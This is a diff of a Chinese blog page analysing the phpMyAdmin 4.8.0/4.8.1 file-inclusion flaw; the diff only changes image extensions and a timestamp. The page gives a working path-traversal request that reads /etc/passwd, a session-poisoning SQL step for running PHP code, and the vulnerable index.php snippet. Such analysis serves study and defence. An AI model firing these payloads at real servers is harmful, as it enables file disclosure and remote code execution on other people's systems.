@@ -96,13 +96,13 @@
 <meta property="og:site_name" content="Even-Want">
 <meta property="og:description" content="影响版本==phpMyAdmin 4.8.0和4.8.1== 漏洞复现漏洞证明index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 漏洞利用 在phpmyadmin中执行SELECT &amp;#39;&amp;lt;?=phpinfo()?&amp;gt;&amp;#39;;语句，并记录cookie中phpMyAdmin对应的值。 包含对应生成的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/2.png">
-<meta property="og:updated_time" content="2019-05-06T07:17:07.183Z">
+<meta property="og:image" content="http://yoursite.com/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/1.PNG">
+<meta property="og:image" content="http://yoursite.com/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/2.PNG">
+<meta property="og:updated_time" content="2019-05-22T13:26:59.676Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="phpmyadmin 4.8.1 远程文件包含漏洞分析">
 <meta name="twitter:description" content="影响版本==phpMyAdmin 4.8.0和4.8.1== 漏洞复现漏洞证明index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 漏洞利用 在phpmyadmin中执行SELECT &amp;#39;&amp;lt;?=phpinfo()?&amp;gt;&amp;#39;;语句，并记录cookie中phpMyAdmin对应的值。 包含对应生成的">
-<meta name="twitter:image" content="http://yoursite.com/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/1.PNG">
 
 
 
@@ -413,7 +413,7 @@
 <li>在phpmyadmin中执行<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code>语句，并记录cookie中phpMyAdmin对应的值。</li>
 <li>包含对应生成的sess文件。</li>
 </ol>
-<p><img src="/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/1.png" alt="1"><br><img src="/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/2.png" alt="2"></p>
+<p><img src="/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/1.PNG" alt="1"><br><img src="/2019/05/06/phpmyadmin-4-8-1-远程文件包含漏洞分析/2.PNG" alt="2"></p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞代码位于index.php50-63行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = array (</span><br><span class="line">    &apos;import.php&apos;, &apos;export.php&apos;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// If we have a valid target, let&apos;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; ! preg_match(&apos;/^index/&apos;, $_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&apos;target&apos;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&apos;target&apos;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&apos;target&apos;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>从代码中能看到，想要进入这个分支，需要满足以下5个条件：</p>
